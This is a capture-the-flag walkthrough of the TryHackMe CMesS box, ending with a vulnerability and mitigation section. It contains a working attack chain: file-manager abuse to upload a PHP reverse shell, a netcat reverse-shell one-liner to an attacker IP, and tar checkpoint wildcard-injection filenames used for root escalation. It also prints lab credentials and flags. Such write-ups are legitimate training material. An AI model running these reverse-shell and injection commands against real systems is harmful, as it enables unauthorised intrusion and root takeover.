# CMesS CTF Walkthrough

**Target:** CMesS  
**Source:** [TryHackMe](https://tryhackme.com/room/cmess)  
**Difficulty:** Medium  
**Target IP:** 10.112.146.219

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Subdomain Discovery](#subdomain-discovery)
- [Credential Discovery](#credential-discovery)
- [Admin Panel & Config Leak](#admin-panel--config-leak)
- [Reverse Shell](#reverse-shell)
- [SSH Foothold](#ssh-foothold)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)
- [Vulnerabilities](#vulnerabilities)
- [Attack Chain Summary](#attack-chain-summary)
- [Tools Used](#tools-used)
- [References](#references)

---

## Overview

CMesS is a medium Linux box running **Gila CMS** behind an Apache web server. The
objective is to gain a foothold on the system and escalate to root, capturing both
the user and root flags. The attack chain covers service enumeration, virtual-host
brute forcing to uncover a `dev` subdomain that leaks admin credentials, abuse of
the Gila CMS file manager to read the database config and drop a PHP reverse shell,
lateral movement to the `andre` user via a backup password left in `/opt`, and a
**wildcard injection** against a root `tar` cron job for privilege escalation.

**Key Skills Required:**
- Network scanning and service enumeration
- Web directory and virtual-host (subdomain) brute forcing
- Credential discovery via exposed development logs
- CMS file-manager abuse for file read and code execution
- Linux privilege escalation via cron + `tar` wildcard injection

---

## Reconnaissance

> **Note:** Add `MACHINE_IP cmess.thm` to `/etc/hosts` before starting.

### Network Scanning

```bash
nmap 10.112.146.219
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
| 80/tcp | http | Apache httpd 2.4.18 (Ubuntu) |

A full service/script scan confirms the versions and reveals the CMS:

```bash
nmap -sV -sC -p- 10.112.146.219
```

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries
|_/src/ /themes/ /lib/
```

Two ports are open. The HTTP service is identified as **Gila CMS**, and the
`robots.txt` already exposes three disallowed directories.

```bash
curl http://cmess.thm/robots.txt
```

```
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

---

## Web Enumeration

### Directory Brute Force

Gobuster maps the application and confirms the typical Gila CMS layout:

```bash
gobuster dir -u http://cmess.thm \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

```
blog        (Status: 200) [Size: 3851]
admin       (Status: 200) [Size: 1580]
api         (Status: 200) [Size: 0]
search      (Status: 200) [Size: 3851]
login       (Status: 200) [Size: 1580]
lib         (Status: 301)
assets      (Status: 301)
themes      (Status: 301)
src         (Status: 301)
...
```

The `/admin` and `/login` endpoints confirm an authentication panel, but no
credentials are available yet.

---

## Subdomain Discovery

Virtual-host fuzzing is run against the `Host` header to find hidden subdomains,
filtering out the default response word count (`-fw 522`):

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u "http://cmess.thm/" -H "HOST: FUZZ.cmess.thm" -fw 522
```

```
dev    [Status: 200, Size: 934, Words: 191, Lines: 31]
```

A `dev` virtual host is discovered. Add it to `/etc/hosts`:

```
10.112.146.219  cmess.thm dev.cmess.thm
```

---

## Credential Discovery

Fetching the development subdomain reveals an internal support log:

```bash
curl http://dev.cmess.thm/
```

The log contains a password-reset conversation between `andre` and support:

```html
<h3>andre@cmess.thm</h3>
<p>...can you guys reset my password if you get a moment, I seem to be unable
to get onto the admin panel.</p>

<h3>support@cmess.thm</h3>
<p>Your password has been reset. Here: KPFTN_f2yxe% </p>
```

> **Recovered credentials:** `andre@cmess.thm : KPFTN_f2yxe%`

---

## Admin Panel & Config Leak

The credentials authenticate to the Gila CMS admin panel:

```
http://cmess.thm/admin
email:    andre@cmess.thm
password: KPFTN_f2yxe%
```

Gila CMS exposes a file manager (`fm`) that accepts an arbitrary path via the `f`
parameter, allowing the database configuration to be read:

```
http://cmess.thm/admin/fm?f=./config.php
```

```php
$GLOBALS['config'] = array (
  'db' => array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
  ...
);
```

> **Recovered credentials:** `root : r0otus3rpassw0rd` (MySQL — not reused for SSH,
> but worth noting)

---

## Reverse Shell

The file manager is also writable, so a PHP reverse shell is uploaded:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nano shell.php
```

Edit the listener details inside the shell:

```php
$ip   = '192.168.132.9';  // attacker IP
$port = 9090;
```

Start a listener:

```bash
rlwrap nc -nvlp 9090
```

Trigger the shell by browsing to the uploaded `shell.php` via the file manager.
A connection lands as `www-data`:

```
connect to [192.168.132.9] from (UNKNOWN) [10.112.146.219]
$ whoami
www-data
```

---

## Lateral Movement to andre

Enumerating `/opt` reveals a world-readable backup password file:

```bash
$ ls -la /opt
-rwxrwxrwx 1 root root 36 Feb  6  2020 .password.bak

$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```

> **Recovered credentials:** `andre : UQfsdCB7aAP6`

---

## SSH Foothold

The backup password authenticates over SSH as `andre`:

```bash
ssh andre@cmess.thm
```

```
andre@cmess:~$ whoami
andre
```

> **Foothold:** `andre`

---

## User Flag

The user flag is in `andre`'s home directory:

```bash
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}
```

> **User flag:** `thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}`

`andre` has no sudo rights, so another escalation path is needed:

```bash
andre@cmess:~$ sudo -l
Sorry, user andre may not run sudo on cmess.
```

---

## Privilege Escalation

Inspecting the system crontab reveals a root job that backs up `andre`'s `backup`
directory using a **wildcard** (`*`):

```bash
andre@cmess:~$ cat /etc/crontab
```

```
*/2 * * * * root cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

Because `tar` runs as root with `*` in a directory the `andre` user controls, the
wildcard can be abused to inject `tar` command-line options as filenames — the
classic **tar checkpoint wildcard injection** ([GTFOBins](https://gtfobins.github.io/gtfobins/tar/)).

Generate a netcat reverse-shell payload on the attacker machine:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.132.9 LPORT=9091
```

```
mkfifo /tmp/xxydlhu; nc 192.168.132.9 9091 0</tmp/xxydlhu | /bin/sh \
  >/tmp/xxydlhu 2>&1; rm /tmp/xxydlhu
```

On the victim, place the payload in a script and create two malicious filenames
that `tar` will interpret as `--checkpoint` options:

```bash
cd /home/andre/backup
echo "mkfifo /tmp/xxydlhu; nc 192.168.132.9 9091 0</tmp/xxydlhu | /bin/sh >/tmp/xxydlhu 2>&1; rm /tmp/xxydlhu" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
chmod 777 shell.sh
```

Start the listener and wait for the next cron run (every 2 minutes):

```bash
rlwrap nc -nvlp 9091
```

When the root cron job runs `tar ... *`, the wildcard expands to include the
crafted option filenames, executing `shell.sh` as root:

```
connect to [192.168.132.9] from (UNKNOWN) [10.112.146.219]
whoami
root
```

---

## Root Flag

```bash
cd /root
cat root.txt
```

```
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```

> **Root flag:** `thm{9f85b7fdeb2cf96985bf5761a93546a2}`

---

## Flags

| Flag | Value | Location |
|------|-------|----------|
| User flag | `thm{c529b5d5d6ab6b430b7eb1903b2b5e1b}` | `/home/andre/user.txt` |
| Root flag | `thm{9f85b7fdeb2cf96985bf5761a93546a2}` | `/root/root.txt` |

---

## Vulnerabilities

### 1. Information Disclosure via Dev Subdomain (High)

**Description:** A `dev.cmess.thm` virtual host hosted an internal development log
that exposed a plaintext password-reset value for the `andre` account.

**Impact:** Direct disclosure of admin-panel credentials, giving an attacker
authenticated access to Gila CMS.

**Mitigation:**
- Restrict access to development/staging hosts (IP allow-listing, authentication).
- Never expose internal logs or reset credentials on publicly reachable hosts.

### 2. Hardcoded Credentials in Configuration (High)

**Description:** Database credentials (`root : r0otus3rpassw0rd`) were stored in
plaintext in `config.php`, readable through the Gila CMS file manager.

**Impact:** Disclosure of sensitive database credentials and reuse risk across
services.

**Mitigation:**
- Store secrets outside the web root using environment variables or a secrets
  manager.
- Apply least privilege to database accounts.

### 3. Authenticated File Manager Abuse → RCE (Critical)

**Description:** The Gila CMS file manager allowed arbitrary file reads (via the
`f` parameter) and the upload/execution of a PHP reverse shell.

**Impact:** Remote code execution as the `www-data` user.

**Mitigation:**
- Upgrade Gila CMS to a patched release.
- Restrict file-manager permissions and validate/limit uploaded file types.

### 4. World-Readable Backup Password (High)

**Description:** A backup password file (`/opt/.password.bak`) was left with
`777` permissions, exposing `andre`'s SSH password to any local user.

**Impact:** Lateral movement from `www-data` to the `andre` user.

**Mitigation:**
- Apply strict file permissions (`600`/`640`) to credential files.
- Avoid storing reusable passwords in backup artifacts.

### 5. Cron + Tar Wildcard Injection (Critical)

**Description:** A root cron job ran `tar -zcf ... *` inside a directory writable
by `andre`. Crafted filenames (`--checkpoint=1`,
`--checkpoint-action=exec=...`) were interpreted as `tar` options, executing
arbitrary commands as root.

**Impact:** Full privilege escalation from `andre` to `root`.

**Mitigation:**
- Never use unquoted wildcards in privileged scripts; specify explicit paths or
  use `--` to terminate option parsing.
- Run backups from directories not writable by unprivileged users.
- Audit cron jobs against GTFOBins wildcard-injection techniques.

---

## Attack Chain Summary

```
Nmap scan → 2 open ports (SSH, HTTP / Gila CMS)
    ↓
gobuster → /admin, /login (auth panel, no creds)
    ↓
ffuf vhost fuzz → dev.cmess.thm
    ↓
dev log leak → andre@cmess.thm : KPFTN_f2yxe%
    ↓
Gila CMS admin → file manager → config.php (db creds)
    ↓
file manager upload → php-reverse-shell.php → www-data
    ↓
/opt/.password.bak (777) → andre : UQfsdCB7aAP6
    ↓
SSH foothold as andre
    ↓
User flag: thm{c529...} (/home/andre/user.txt)
    ↓
/etc/crontab → root: tar -zcf /tmp/andre_backup.tar.gz *
    ↓
tar wildcard injection (--checkpoint-action=exec) → root shell
    ↓
Root flag: thm{9f85...} (/root/root.txt)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| curl | Inspecting robots.txt and the dev subdomain log |
| Gobuster | Web directory enumeration |
| ffuf | Virtual-host / subdomain brute forcing |
| php-reverse-shell / netcat / rlwrap | Reverse shell and listener |
| msfvenom | Generating the netcat reverse-shell payload |
| tar / cron | Privilege escalation (wildcard injection) |

---

## References

- [TryHackMe — CMesS](https://tryhackme.com/room/cmess)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)
- [ffuf](https://github.com/ffuf/ffuf)
- [Gila CMS](https://github.com/GilaCMS/gila)
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)

---
